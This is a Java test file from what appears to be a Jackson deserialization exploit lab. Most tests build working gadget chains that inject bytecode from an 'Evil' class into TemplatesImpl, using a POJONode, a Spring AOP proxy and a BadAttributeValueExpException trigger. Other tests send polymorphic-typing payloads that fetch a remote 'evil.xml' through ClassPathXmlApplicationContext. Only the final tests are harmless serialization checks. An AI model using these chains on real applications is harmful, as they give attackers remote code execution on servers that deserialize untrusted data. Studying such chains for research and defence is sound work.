package com.endlessshw.jacksonrange;

import com.endlessshw.jacksonrange.bean.User;
import com.endlessshw.jacksonrange.util.SerializeUtil;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.security.utils.Base64;
import com.sun.org.glassfish.external.statistics.impl.RangeStatisticImpl;
import java.lang.reflect.InvocationHandler;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.junit.jupiter.api.Test;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;

/**
 * @author hasee
 * @version 1.0
 * @description: 测试 Jackson 序列化和反序列化以及链
 * @date 2024/10/26 14:20
 */
public class JacksonTest {

    @Test
    public void testJacksonChain_stable() throws Exception {
        // 1. 构造 sink
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.jacksonrange.util.Evil");
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        // 要求 1 - 注入恶意字节码
        Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{bytes});
        // 要求 2 - 保证 _name 不为 null
        Field nameField = templates.getClass().getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "EndlessShw");

        // 2. 移除掉 BaseJsonNode 的 writeReplace 方法，防止序列化失败
        CtClass baseJNctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = baseJNctClass.getDeclaredMethod("writeReplace");
        baseJNctClass.removeMethod(writeReplace);
        baseJNctClass.toClass();

        // 3. 构造 chain
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        POJONode jsonNodes = new POJONode(proxy);

        // 4. 构造 kick-off
        BadAttributeValueExpException toBeSerBAVEException = new BadAttributeValueExpException("123");
        Field valField = toBeSerBAVEException.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(toBeSerBAVEException, jsonNodes);

        String serialize = SerializeUtil.serialize(toBeSerBAVEException);
        SerializeUtil.unSerialize(serialize);
    }

    @Test
    public void testJacksonChain() throws Exception{

        // 1. 构造 sink
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.jacksonrange.util.Evil");
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        // 要求 1 - 注入恶意字节码
        Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{bytes});
        // 要求 2 - 保证 _name 不为 null
        Field nameField = templates.getClass().getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "EndlessShw");

        // 2. 移除掉 BaseJsonNode 的 writeReplace 方法，防止序列化失败
        CtClass baseJNctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = baseJNctClass.getDeclaredMethod("writeReplace");
        baseJNctClass.removeMethod(writeReplace);
        baseJNctClass.toClass();

        // 3. 构造 chain
        POJONode jsonNodes = new POJONode(templates);

        // 4. 构造 kick-off
        BadAttributeValueExpException toBeSerBAVEException = new BadAttributeValueExpException("123");
        Field valField = toBeSerBAVEException.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(toBeSerBAVEException, jsonNodes);

        String serialize = SerializeUtil.serialize(toBeSerBAVEException);
        SerializeUtil.unSerialize(serialize);
    }


    @Test
    public void testClassPathXmlApplicationContext_enableDefaultTyping() throws Exception {
        String payload = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\", \"http://127.0.0.1:8888/evil.xml\"]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.readValue(payload, Object.class);
        // User user = new User();
        // user.setTest(new ClassPathXmlApplicationContext("http://127.0.0.1:8888/evil.xml"));
        // ObjectMapper mapper = new ObjectMapper();
        // mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
        // String payload = mapper.writeValueAsString(user);
        // mapper.readValue(payload, User.class);
    }

    @Test
    public void testClassPathXmlApplicationContext_JsonTypeInfo() throws Exception {
        User user = new User();
        user.setTest(new ClassPathXmlApplicationContext("http://127.0.0.1:8888/evil.xml"));
        ObjectMapper mapper = new ObjectMapper();
        String payload = mapper.writeValueAsString(user);
        mapper.readValue(payload, User.class);
    }


    /**
     * JDK8 好像打不通
     *
     * @throws Exception
     */
    @Test
    public void testTemplatesImpl() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.jacksonrange.util.Evil");
        byte[] bytes = ctClass.toBytecode();
        String exp = Base64.encode(bytes);
        exp = exp.replace("\n","");
        String jsonInput = aposToQuotes("{\"object\":['com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" +
                "{\n" +
                "'transletBytecodes':['"+exp+"'],\n" +
                "'transletName':'feng',\n" +
                "'outputProperties':{}\n" +
                "'_factory':{}\n" +
                "}\n" +
                "]\n" +
                "}");
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);
        mapper.readValue(jsonInput, User.class);
    }

    @Test
    public void testJackson() throws IOException {
        User user = new User();
        user.setName("EndlessShw");
        user.setAge(24);
        ObjectMapper objectMapper = new ObjectMapper();

        // 序列化
        String serializedStr = objectMapper.writeValueAsString(user);
        System.out.println(serializedStr);

        // objectMapper.enableDefaultTyping();

        // 反序列化
        User unserializedUser = objectMapper.readValue(serializedStr, user.getClass());
        System.out.println(unserializedUser);
    }

    @Test
    public void testPOJO() {
        POJONode jsonNodes = new POJONode(new User());
        System.out.println(jsonNodes);
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }
}
